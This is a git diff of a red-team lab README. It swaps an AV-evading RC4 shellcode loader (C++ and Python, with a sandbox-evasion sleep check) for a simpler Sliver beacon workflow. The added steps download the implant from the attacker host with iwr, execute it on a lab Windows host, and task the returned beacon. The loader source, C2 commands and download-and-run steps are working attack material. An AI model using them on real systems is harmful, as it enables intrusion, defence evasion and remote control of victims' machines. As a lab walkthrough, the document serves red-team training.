@@ -385,244 +385,37 @@ sliver >
 ### Sliver Implant
 
 In sliver, generate a beacon 
-
 ```bash
-sliver > generate beacon --seconds 30 --jitter 3 --os windows --arch amd64 --format shellcode --http 192.168.56.100 --name goad-http --save /tmp/goad-http.bin -G --skip-symbols
+sliver > generate beacon --http 192.168.56.100
+
+[*] Generating new windows/amd64 beacon implant binary (1m0s)
+[*] Symbol obfuscation is enabled
+[*] Build completed in 1m0s
+[*] Implant saved to /home/goad/OTHER_WITCH.exe
+
+[*] Beacon 094da7cd OTHER_WITCH - 192.168.56.22:50267 (castelblack) - windows/amd64 - Tue, 21 Nov 2023 11:06:50 UTC
 ```
 
-Now rc4 encrypt the shellcode
-```python
-import sys 
-
-def rc4(data, key):
-    keylen = len(key)
-    s = list(range(256))
-    j = 0
-    for i in range(256):
-        j = (j + s[i] + key[i % keylen]) % 256
-        s[i], s[j] = s[j], s[i]
-
-    i = 0
-    j = 0
-    encrypted = bytearray()
-    for n in range(len(data)):
-        i = (i + 1) % 256
-        j = (j + s[i]) % 256
-        s[i], s[j] = s[j], s[i]
-        encrypted.append(data[n] ^ s[(s[i] + s[j]) % 256])
-
-    return encrypted
-
-if __name__ == "__main__":
-    if len(sys.argv) != 3:
-        print("Usage: ./rc4.py <key> <filename>")
-        exit(0)
-
-    key = sys.argv[1]
-    filename = sys.argv[2]
-
-    with open(filename, 'rb') as f:
-        data = f.read() 
-
-    encrypted = rc4(data, key.encode())
-    
-    with open(f"{filename}.enc", 'wb') as f:
-        f.write(encrypted)
-
-    print(f"Written {filename}.enc")
-```
-
-This should give us goad-http.bin.enc
-
-It takes a the encryption key, in this case seomthing inconspicuous such as "advapi32.dll"incase the string is picked up.
-
-```bash
-goad@ubuntu-jumpbox:/tmp$ python3 rc4.py advapi32.dll goad-http.bin 
-Written goad-http.bin.enc
-```
-
-Now to make it useable as assembly code for use in the loader.
-
-```bash
-goad@ubuntu-jumpbox:/tmp$ hexdump -v -e '1/2 "dw 0%.4xh\n"' goad-http.bin.enc |tee out.txt
-```
-
-Open up Visual Studio, im using 2019 and create a c++ console app, name it whatever and remove the boiler plate code it goves you.
-
-Paste in this
-
-```c++
-#include <stdio.h>
-#include <Windows.h>
-#include <chrono>
-#include <thread>
-
-#define _CRT_SECURE_NO_DEPRECATE
-#pragma warning (disable : 4996)
-
-extern "C" void RunData();
-
-void rc4(unsigned char* data, int len, const char* key) {
-    int keylen = strlen(key);
-    unsigned char s[256];
-    for (int i = 0; i < 256; i++) {
-        s[i] = i;
-    }
-
-    unsigned char j = 0;
-    for (int i = 0; i < 256; i++) {
-        j = (j + s[i] + key[i % keylen]) % 256;
-        unsigned char tmp = s[i];
-        s[i] = s[j];
-        s[j] = tmp;
-    }
-
-    int i = 0;
-    j = 0;
-    for (int n = 0; n < len; n++) {
-        i = (i + 1) % 256;
-        j = (j + s[i]) % 256;
-        unsigned char tmp = s[i];
-        s[i] = s[j];
-        s[j] = tmp;
-        data[n] ^= s[(s[i] + s[j]) % 256];
-    }
-}
-
-int main(int argc, char **argv)
-{    
-    // Simple sandbox evasion
-    auto start = std::chrono::system_clock::now();
-    std::this_thread::sleep_for(std::chrono::seconds(5));
-    auto end = std::chrono::system_clock::now();
-    std::chrono::duration<double> elapsed_seconds = end - start;
-    if (elapsed_seconds.count() <= 4.5) {
-        exit(0);
-    }
-    // Run our payload function
-    const char* key = "advapi32.dll"; // modify with your key
-    int len = 200774; // modify with payload length
-    DWORD oldProtect = 0;
-    if (!VirtualProtect((LPVOID)&RunData, len, PAGE_EXECUTE_READWRITE, &oldProtect)) {
-        printf("Error: %d", GetLastError());
-    }
-    rc4((unsigned char*) & RunData, len, key);
-    VirtualProtect((LPVOID)&RunData, len, oldProtect, &oldProtect);
-    RunData();
-}
-```
-
-Right click the solution and choose build dependencies
-
-
-![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/cee3fc40-5087-42cc-a12d-92f44deb9cd9)
-
-Then select masm
-
-
-![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/562d196a-9f2f-4b82-b3b5-1b2f3e3db5cf)
-
-Right click "SOurce Files" and select add new item. Name it data.asm and click add
-
-
-![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/08e572b8-cb5f-4e45-b532-e1070d007465)
-
-You sghould now have data.asm file here
-
-
-![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/106d32d0-6b3c-452c-8d87-747c054cbfaa)
-
-
-In the data.asm file add this boilerplate, we will edit it in a sec.
-
-```c
-.CODE
-RunData PROC
-
-ret
-
-RunData ENDP
-END
-```
-
-It will look like this now
-
-
-![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/e8d24f26-4f14-4d15-8b84-1ccc0bc4835f)
-
-Right click the data.asm file in soltuion explorer and select open with and choose notepad. We are going to copy the assembly code generated previosuly into it.
-
-NOTE - this is quite a large file
-
-
-![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/3c65542f-606d-4e2a-9cf2-6f99d051fb8c)
-
-You should have a file similar to this
-
-
-![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/7a1524cb-28fc-4e41-a9a5-ebd6e05e535b)
-
-In the main code ensure you update `int len` with the correct length
-
-![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/9fc64846-fe3f-495b-9032-05e154eafc2a)
-
-From here 
-```bash
--rw-rw-r--  1 goad goad  55064140 Nov 20 20:27 out.txt
-```
-
-Change the following properties. Select the solution, right click and go to properties, then C/C++ > Code Generation and change
-
-This
-
-![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/53260925-0b64-439b-a0fb-bf5adad25704)
-
-This
-
-![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/bff34ada-4f24-4642-ad0f-946622147230)
-
-Now go to Linker > Debugging and change this
-
-![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/27e9f53e-0cc0-4da1-9d93-f8ad772ea036)
-
-Now Linker > Advanced and change this
-
-![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/27e521be-25c5-424c-b7bd-f5acab4f8ce8)
-
-and this 
-
-![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/469d2dae-0727-432a-9862-75c1a379f52a)
-
-Click apply and OK, now Build
-
-![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/11b2f9cf-e9ef-403b-8858-a12d07266142)
-
-Wait for around 10 mins and it should complete
-
-![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/a46dec73-dfdc-4955-b728-36363d97181a)
-
-Now transfer the .exe to the ubuntu jump host. scp is a good shout.
-
-all the above taken from - VulnLab Wuitai Walkthrough by xct
-
-Start http job in sliver
+Now setup a job to await the connection from the beacon
 
 ```bash
 sliver > http
 
 [*] Starting HTTP :80 listener ...
-[*] Successfully started job #1
+
+---SNIP---
 
 sliver > jobs
 
  ID   Name   Protocol   Port   Stage Profile 
 ==== ====== ========== ====== ===============
- 1    http   tcp        80      
+ 3    http   tcp        80
 ```
-Transfer .exe to victim with iwr and execute. Even with Defender running it shouldnt be an issue.
+
+Go back to the RDP Session and transfer the .exe over of call from SMB share
 
 ```powershell
-PS C:\Users\samwell.tarly> iwr http://192.168.56.100:8443/OneDriveUpdater.exe -o OneDriveUpdater.exe
+PS C:\Users\samwell.tarly> iwr http://192.168.56.100:8080/OTHER_WITHC.exe -O goad.exe
 PS C:\Users\samwell.tarly> ls
 
 
@@ -643,11 +436,44 @@ d-r---       11/20/2023   7:34 PM                Pictures
 d-r---       11/20/2023   7:34 PM                Saved Games
 d-r---       11/20/2023   7:34 PM                Searches
 d-r---       11/20/2023   7:34 PM                Videos
--a----       11/20/2023  10:04 PM       11138048 OneDriveUpdater.exe
+-a----       11/21/2023  11:06 AM       17265664 goad.exe
 
-PS C:\Users\samwell.tarly> .\OneDriveUpdater.exe
+PS C:\Users\samwell.tarly> .\goad.exe
+```
+Check back in Sliver and we shpuld have our beacon returned to us
+
+```bash
+[*] Beacon 094da7cd OTHER_WITCH - 192.168.56.22:50267 (castelblack) - windows/amd64 - Tue, 21 Nov 2023 11:06:50 UTC
+
+sliver > beacons
+
+ ID         Name          Transport   Hostname      Username              Operating System   Last Check-In   Next Check-In 
+========== ============= =========== ============= ===================== ================== =============== ===============
+ 094da7cd   OTHER_WITCH   http(s)     castelblack   NORTH\samwell.tarly   windows/amd64      12s             51s           
 ```
 
+To interact with the beacon type `use` and the ID of the Beacon. As its a beacon and not an active session, Sliver will wait for the beacon to check in then task it with the commands to run, in this case `ls`
+
+You can check which tasks are pending with the `tasks` command
+
+```bash
+sliver > use 094da7cd
+
+[*] Active beacon OTHER_WITCH (094da7cd-7f7f-49f3-b6c1-ff5d5f578385)
+
+sliver (OTHER_WITCH) > ls
+
+[*] Tasked beacon OTHER_WITCH (a09c2aff)
+
+sliver (OTHER_WITCH) > tasks
+
+ ID         State     Message Type   Created                         Sent   Completed 
+========== ========= ============== =============================== ====== ===========
+ a09c2aff   pending   Ls             Tue, 21 Nov 2023 11:22:16 UTC
+
+```
+
+Now our Beacon is up and running lets run an nmap scan against a DC in the network.
 
 
 
